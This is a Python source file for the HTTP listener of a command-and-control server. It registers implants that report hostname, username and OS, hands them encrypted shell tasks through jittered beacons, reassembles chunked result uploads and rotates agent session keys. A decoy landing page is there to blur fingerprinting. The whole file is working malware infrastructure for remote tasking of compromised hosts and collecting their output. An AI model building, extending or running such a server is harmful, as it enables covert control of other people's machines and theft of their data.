"""HTTP listener for the C2 server.

Endpoints (all behind the same jittered beacon profile):
  POST /register  -> agent checks in, gets a session key
  POST /beacon    -> agent polls for tasks / posts results

All request and response bodies are JSON with an `enc` field containing
AES-256-GCM ciphertext under the agent's session key.
"""
from __future__ import annotations

import base64
import logging

from flask import Flask, jsonify, request

from .chunks import ChunkStore
from .crypto import decrypt, derive_key, encrypt, random_token
from .state import Agent, State

log = logging.getLogger("c2.listener")

PSK = "change-me-shared-key"  # replaced via env in production


def create_app(state: State, psk: str = PSK) -> Flask:
    app = Flask(__name__)
    app.config["PSK"] = psk
    chunks = ChunkStore()

    # ---- helpers ----------------------------------------------------------
    def _fail(msg: str, code: int = 400):
        return jsonify({"error": msg}), code

    def _require_agent() -> tuple[Agent, None] | tuple[None, tuple]:
        agent_id = request.headers.get("X-Agent")
        if not agent_id:
            return None, _fail("missing X-Agent header")
        agent = state.get_agent(agent_id)
        if not agent:
            # Explicit status so implants can re-register after server restart.
            return None, (jsonify({"status": "unknown_agent", "error": "unknown agent"}), 404)
        state.touch_agent(agent)
        return agent, None

    # ---- registration -----------------------------------------------------
    @app.post("/register")
    def register():
        body = request.get_json(silent=True) or {}
        nonce_hex = body.get("nonce")
        enc = body.get("enc")
        if not nonce_hex or not enc:
            return _fail("missing nonce/enc")

        nonce = bytes.fromhex(nonce_hex)
        # registration payload is encrypted with the PSK-derived key, since
        # the per-agent session key does not exist yet.
        reg_key = derive_key(psk, nonce)
        try:
            payload = decrypt(enc, reg_key)
        except Exception:
            return _fail("bad registration ciphertext")

        # payload format: "hostname|username|os"
        parts = payload.split("|", 2)
        if len(parts) != 3:
            return _fail("malformed registration payload")
        hostname, username, os_name = parts

        agent_id = random_token(8)
        session_key = derive_key(psk, agent_id.encode("utf-8") + nonce)
        agent = Agent(
            agent_id=agent_id,
            hostname=hostname,
            username=username,
            os=os_name,
            session_key=session_key,
        )
        state.register_agent(agent)
        # Compact line — operator console stays readable.
        log.info("+ agent %s  %s@%s", agent_id, username, hostname)

        return jsonify(
            {
                "agent_id": agent_id,
                "enc": encrypt("OK|" + agent_id, reg_key),
            }
        )

    # ---- beaconing --------------------------------------------------------
    @app.post("/beacon")
    def beacon():
        agent, err = _require_agent()
        if err:
            return err
        body = request.get_json(silent=True) or {}
        enc = body.get("enc")
        if enc:
            try:
                payload = decrypt(enc, agent.session_key)
            except Exception:
                return _fail("bad beacon ciphertext")
            # beacon payload format: "RESULT:<task_id>:<result>" or "HEARTBEAT"
            if payload.startswith("RESULT:"):
                _, task_id, result = payload.split(":", 2)
                state.submit_result(task_id, result)
                log.info("agent %s -> result for %s", agent.agent_id, task_id)
            # heartbeats just refresh last_seen

        # hand back the next queued task (if any)
        task = state.pop_next_task(agent.agent_id)
        if task is None:
            return jsonify({"enc": encrypt("NOP", agent.session_key)})

        cmd_line = " ".join([task.cmd, *task.args])
        return jsonify(
            {
                "enc": encrypt(f"TASK:{task.task_id}:{cmd_line}", agent.session_key),
            }
        )

    @app.post("/chunk")
    def chunk():
        agent, err = _require_agent()
        if err:
            return err
        body = request.get_json(silent=True) or {}
        chunk_id = body.get("chunk_id")
        seq = body.get("seq")
        total = body.get("total")
        enc = body.get("enc")
        if not chunk_id or not seq or not total or not enc:
            return _fail("missing chunk fields")
        try:
            data = decrypt(enc, agent.session_key)
        except Exception:
            return _fail("bad chunk ciphertext")
        assembled = chunks.add(agent.agent_id, str(chunk_id), int(seq), int(total), data.encode("utf-8") if isinstance(data, str) else data)
        chunks.prune()
        if assembled:
            # reassembled payload is treated as a large result line
            try:
                payload = assembled.decode("utf-8")
            except UnicodeDecodeError:
                payload = assembled.hex()
            if payload.startswith("RESULT:"):
                _, task_id, result = payload.split(":", 2)
                state.submit_result(task_id, result)
            return jsonify({"enc": encrypt("CHUNK_DONE", agent.session_key)})
        return jsonify({"enc": encrypt("CHUNK_OK", agent.session_key)})

    @app.post("/rotate_key")
    def rotate_key():
        agent, err = _require_agent()
        if err:
            return err
        body = request.get_json(silent=True) or {}
        enc = body.get("enc")
        if not enc:
            return _fail("missing enc")
        try:
            plain = decrypt(enc, agent.session_key)
        except Exception:
            return _fail("bad rotate_key ciphertext")
        if not plain.startswith("KEY:"):
            return _fail("malformed rotate_key payload")
        try:
            new_key = base64.b64decode(plain[4:].encode("ascii"))
        except Exception:
            return _fail("bad key encoding")
        if len(new_key) != 32:
            return _fail("key must be 32 bytes")
        state.set_session_key(agent, new_key)
        return jsonify({"enc": encrypt("OK", agent.session_key)})

    @app.get("/")
    def index():
        # innocuous landing page to blur fingerprinting
        return jsonify({"status": "ok"})

    return app
